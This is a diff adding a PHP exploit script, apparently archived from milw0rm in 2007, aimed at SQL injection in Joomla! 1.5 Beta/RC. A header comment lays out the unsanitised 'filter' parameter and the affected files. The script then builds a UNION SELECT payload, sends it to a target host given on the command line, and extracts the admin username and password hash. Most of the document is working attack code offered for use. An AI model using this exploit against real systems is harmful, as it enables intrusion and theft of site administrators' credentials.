@@ -1,0 +1,212 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?php
+
+/*
+
+Explanation:
+
+Although the comment points out that the "filter" variable is supposedly cleansed there is no 
+input validation being performed except for the fact that all input is being turned into lowercase.
+
+Affected Files:
+
+components/com_content/models/archive.php
+components/com_content/models/category.php
+components/com_content/models/section.php
+
+Code:
+
+$filter = JRequest::getVar('filter', '', 'post');
+if ($filter) {
+	// clean filter variable
+	$filter = JString::strtolower($filter);
+
+	// Get the page/component configuration
+	$params = &$mainframe->getPageParameters();
+	switch ($params->get('filter_type', 'title'))
+	{
+		case 'title' :
+		$where .= ' AND LOWER( a.title ) LIKE \'%'.$filter.'%\'';
+		break;
+
+		case 'author' :
+		$where .= ' AND ( ( LOWER( u.name ) LIKE \'%'.$filter.'%\' ) OR ( LOWER( a.created_by_alias ) LIKE \'%'.$filter.'%\' ) )';
+		break;
+
+		case 'hits' :
+		$where .= ' AND a.hits LIKE \'%'.$filter.'%\'';
+		break;
+  	}
+}
+return $where;
+
+Notes:
+
+I found this in the first week of the 1.5 release, just wanted to see if nobody would realize
+it was there and hopefully the same bug was about in FINAL, meh!
+
+I must applaud the developers for their multi-factor authenication code they
+added to the 1.5 version. For this reason I was unable to script a "login -> upload arbitrary 
+script" exploit. Maybe someone better than me can do it...who knows!
+
+magic_quotes_gpc must be set to off in order for this script to work!
+
+Upload Arbitrary Files:
+
+1. Login as admin via /administrator/
+2. Browse to /administrator/index.php?option=com_installer
+3. In the "Upload Package File" section choose ANY file you wish to upload
+4. Browse to /tmp/[FILE] and it's there!
+
+*/
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+if ($argc<3) {
+print "-------------------------------------------------------------------------\r\n";
+print "           Joomla! 1.5 Beta1/Beta2/RC1 SQL Injection Exploit\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "Usage: ./w4ck1ng_joomla.php [HOST] [PATH] ([PREFIX] [USER_ID])\r\n\r\n";
+print "[HOST] 	  	= Target server's hostname or ip address\r\n";
+print "[PATH] 	  	= Path where Joomla is located\r\n";
+print "[PREFIX]	= Joomla table prefix\r\n";
+print "[USER_ID]  	= User ID to grab credentials for\r\n\r\n";
+print "e.g. ./w4ck1ng_joomla.php victim.com /joomla/\r\n";
+print "     ./w4ck1ng_joomla.php victim.com /joomla/ jos_ 62\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "            		 http://www.w4ck1ng.com\r\n";
+print "            		        ...Silentz\r\n";
+print "-------------------------------------------------------------------------\r\n";
+die;
+}
+
+//Props to rgod for the following functions
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$host = $argv[1];
+$path = $argv[2];
+$prefix = $argv[3];
+$userid = $argv[4];
+$port=80;$proxy="";
+
+for ($i=5; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+function head(){
+
+	print "-------------------------------------------------------------------------\r\n";
+	print "              Joomla! 1.5 Beta1/Beta2 SQL Injection Exploit\r\n";
+	print "-------------------------------------------------------------------------\r\n";
+
+}
+
+function footer(){
+
+	print "-------------------------------------------------------------------------\r\n";
+	print "            		 http://www.w4ck1ng.com\r\n";
+	print "            		        ...Silentz\r\n";
+	print "-------------------------------------------------------------------------\r\n";
+
+}
+
+    $sql = "%' UNION SELECT 0,password,0,0,0,0,0,password,0,username,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,username FROM ";
+
+	if(isset($prefix)){$sql .= $prefix;}
+ 	  else{$sql .= "jos_";}
+
+    $sql .= "users WHERE id='";
+
+	if(isset($userid)){$sql .= $userid;}
+ 	  else{$sql .= "62";}
+
+    $sql .= "'/*";
+
+    $data = "filter=$sql&month=&year=&limit=20&view=archive&option=com_content";
+
+    $packet ="POST " . $path . "index.php?option=com_content&view=archive HTTP/1.1\r\n";
+    $packet.="Host: ".$host."\r\n";
+    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+    $packet.="Content-Length: ".strlen($data)."\r\n";
+    $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\r\n";
+    $packet.="Connection: Close\r\n\r\n";
+    $packet.=$data;
+    sendpacketii($packet);
+
+    $temp = explode("Author: ",$html);
+    $temp2 = explode("<",$temp[1]);
+    $username = $temp2[0];
+
+    $temp = explode("Created: ",$html);
+    $temp2 = explode("<",$temp[1]);
+    $hash = $temp2[0];
+
+	head();
+
+	if($username && $hash){
+	 echo "[+] Admin User: " . $username . "\n";
+	 echo "[+] Admin Hash: " . $hash . "\n";
+	}
+	
+	else{echo "[-] Exploit Failed...\n";}
+
+	footer();
+?>
+
+# milw0rm.com [2007-09-01]
